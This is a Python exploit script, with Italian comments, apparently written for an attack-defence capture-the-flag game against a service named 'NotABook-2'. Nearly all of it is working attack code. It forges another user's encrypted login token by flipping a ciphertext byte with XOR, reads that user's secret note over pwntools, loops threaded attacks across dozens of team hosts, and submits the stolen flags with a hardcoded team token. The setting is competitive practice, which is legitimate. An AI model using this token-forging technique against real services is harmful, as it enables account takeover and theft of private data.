#/usr/bin/python3

import requests, time, re, string, random
from threading import Thread, Lock
from pwn import *

TEAM_TOKEN = "30079879d4f6d98c63404aca4a44caaa"			# TEAM_TOKEN INVIATO PER EMAIL
CHALLENGE_NAME = "NotABook-2"		# NOME DELLA CHALLENGE INDICATO IN flagIds

#######################      UTILS      ######################################

def generate_random_string(length):
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

def generate_fake_flag():
    letters = string.ascii_uppercase + string.digits
    result_str = ''.join(random.choice(letters) for i in range(31)) + "="
    return result_str

def add_noise(url, header=None, payload=None, session=None):
	if payload == None:
		if session == None:
			if header == None:
				requests.get(url, timeout=3)
			else:
				requests.get(url, headers=header, timeout=3)
		else:
			if header == None:
				session.get(url, timeout=3)
			else:
				session.get(url, headers=header, timeout=3)
	else:
		if session == None:
			if header == None:
				requests.post(url, data=payload, timeout=3)
			else:
				requests.post(url, headers=header, data=payload, timeout=3)
		else:
			if header == None:
				session.post(url, data=payload, timeout=3)
			else:
				session.post(url, headers=header, data=payload, timeout=3)

	print(f"Rumore aggiunto - {url} : {payload}")

##############################################################################


#noFlagIds = {CHALLENGE_NAME: {'10.60.1.1': [''], '10.60.2.1': [''], '10.60.3.1': [''], '10.60.4.1': [''], '10.60.5.1': [''], '10.60.6.1': [''], '10.60.7.1': [''], '10.60.8.1': [''], '10.60.9.1': [''], '10.60.10.1': [''], '10.60.11.1': [''], '10.60.12.1': [''], '10.60.13.1': [''], '10.60.14.1': [''], '10.60.15.1': [''], '10.60.16.1': [''], '10.60.17.1': [''], '10.60.18.1': [''], '10.60.19.1': [''], '10.60.20.1': [''], '10.60.21.1': [''], '10.60.22.1': [''], '10.60.23.1': [''], '10.60.24.1': [''], '10.60.25.1': [''], '10.60.26.1': [''], '10.60.27.1': [''], '10.60.28.1': [''], '10.60.29.1': [''], '10.60.30.1': [''], '10.60.31.1': [''], '10.60.32.1': [''], '10.60.33.1': [''], '10.60.34.1': [''], '10.60.35.1': [''], '10.60.36.1': [''], '10.60.37.1': [''], '10.60.38.1': [''], '10.60.39.1': [''], '10.60.40.1': [''], '10.60.41.1': [''], '10.60.42.1': [''], '10.60.43.1': ['']}}

lock = Lock()


class Attacker(Thread):
	def __init__(self, ip, flagids):
		Thread.__init__(self)
		self.ip = ip
		self.flagids = flagids
		

	def run(self):
		flag_list = []
		for hint in self.flagids[CHALLENGE_NAME][self.ip]:
			try:
				flag = get_flag(self.ip, hint)
				print(flag)
			except Exception as e:
				print("ERR: {}".format(e))
				continue
			if flag not in flag_list:
				flag_list.append(flag)
	
		lock.acquire()
		flags.extend(flag_list)
		lock.release()


def exploit_with_threads(flagids):
	c = 1
	i = 0
	size = len(flagids[CHALLENGE_NAME])
	for ip in flagids[CHALLENGE_NAME]:
		print(f"{ip}\t-\t{c} / {size} ...")

		threads.append(Attacker(ip, flagids))
		threads[i].start()

		i += 1
		c += 1
	
	for i in range(size):
		threads[i].join()


def exploit(flagids):
	flag_list = []
	c = 1
	for ip in flagids[CHALLENGE_NAME]:
		size = len(flagids[CHALLENGE_NAME])
		print(f"{ip}\t-\t{c} / {size} ...")
		for hint in flagids[CHALLENGE_NAME][ip]:
			try:
				flag = get_flag(ip, hint)
				print(flag)
			except Exception as e:
				print("ERR: {}".format(e))
				continue
			if flag not in flag_list:
				flag_list.append(flag)

		c += 1
	return flag_list


# EXPLOIT FINALE CON USO DEI THREADS
def attack_with_threads():
	global flags
	global threads
	while True:
		flags = []
		threads = []
		print("Running exploit...")

		flagids = requests.get(f"http://10.10.0.1:8081/flagIds?service={CHALLENGE_NAME}").json()
		# flagids = noFlagIds
		exploit_with_threads(flagids)
		
		print()
		print(flags)

		print("\nPutting flags...")
		r = requests.put('http://10.10.0.1:8080/flags', headers={'X-Team-Token': TEAM_TOKEN}, json=flags).text
		print(r)

		print("Exploit ok...\n\nRepeat after sleep...")
		print("\n")

		time.sleep(100)


# EXPLOIT FINALE
def attack():
	while True:
		print("Running exploit...")

		flagids = requests.get(f"http://10.10.0.1:8081/flagIds?service={CHALLENGE_NAME}").json()
		# flagids = noFlagIds
		flags = exploit(flagids)
		
		print()
		print(flags)

		print("\nPutting flags...")
		r = requests.put('http://10.10.0.1:8080/flags', headers={'X-Team-Token': TEAM_TOKEN}, json=flags).text
		print(r)

		print("Exploit ok...\n\nRepeat after sleep...")
		print("\n")

		time.sleep(60)
			
	
def get_flag(ip, hint):
	letter = hint[-1]
	if letter == 'a':
		hex_letter = ord('b')
	else:
		hex_letter = ord('a')
	hex_hint_letter = ord(letter)
	if letter == 'a':
		new_user = hint[:-1] + 'b'
	else:
		new_user = hint[:-1] + 'a'
	
	with context.quiet:
		sess_pwn = remote(f"{ip}", 1234, timeout=2)
		sess_pwn.sendlineafter(b">: ", b"2", timeout=2)
		sess_pwn.sendlineafter(b">: ", b"2", timeout=2)
		sess_pwn.sendlineafter(b"username: ", new_user.encode(), timeout=2)
		resp = sess_pwn.recvuntil(b"Authentication successful.")
		token = resp.decode().split("You can login with your encrypted token: ")[1].split("\n")[0]
		
		val = int(token[-6:-4], 16)
		new_hex = val ^ hex_letter
		final_l = "{:02x}".format(hex_hint_letter ^ new_hex)
		

		new_token = token[:-6] + str(final_l) + token[-4:]
		sess_pwn.close()
		
		sess_pwn = remote(f"{ip}", 1234, timeout=1)
		sess_pwn.sendlineafter(b">: ", b"2", timeout=1)
		sess_pwn.sendlineafter(b">: ", b"1", timeout=1)
		sess_pwn.sendlineafter(b"token: ", new_token.encode(), timeout=1)
		sess_pwn.sendlineafter(b">: ", b"2", timeout=1)
		sess_pwn.recvuntil(b"Available notes:", timeout=1)
		note = sess_pwn.recvuntil(b"[1]", timeout=1).decode().split("\n")
		id = -1
		for n in note:
			if "(" not in n:
				continue
			x = n.split(" ")
			if "secret" in x[1]:
				id = x[0][1:-1]

		if id == -1:
			raise Exception("id non trovato")
		
		sess_pwn.sendlineafter(b">: ", b"3", timeout=1)
		sess_pwn.sendlineafter(b": ", id.encode(), timeout=1)
		flag = sess_pwn.recvuntil(b"=").decode().split("\n")[2]

	return flag


## TEST get_flag
def test():
	ip = "10.60.0.1"
	hint = "RMPrRjpFC1kwPIj1pJVQJa"
	flag = ""
	try:
		flag = get_flag(ip, hint)
	except Exception as e:
		print(f"ERROR {e}")
		return
	print(flag)
	return
	flags = [flag]
	print("\nPutting flags...")
	r = requests.put('http://10.10.0.1:8080/flags', headers={'X-Team-Token': TEAM_TOKEN}, json=flags).text
	print(r)


def main():
	# test()
	# attack()
	attack_with_threads()


main()
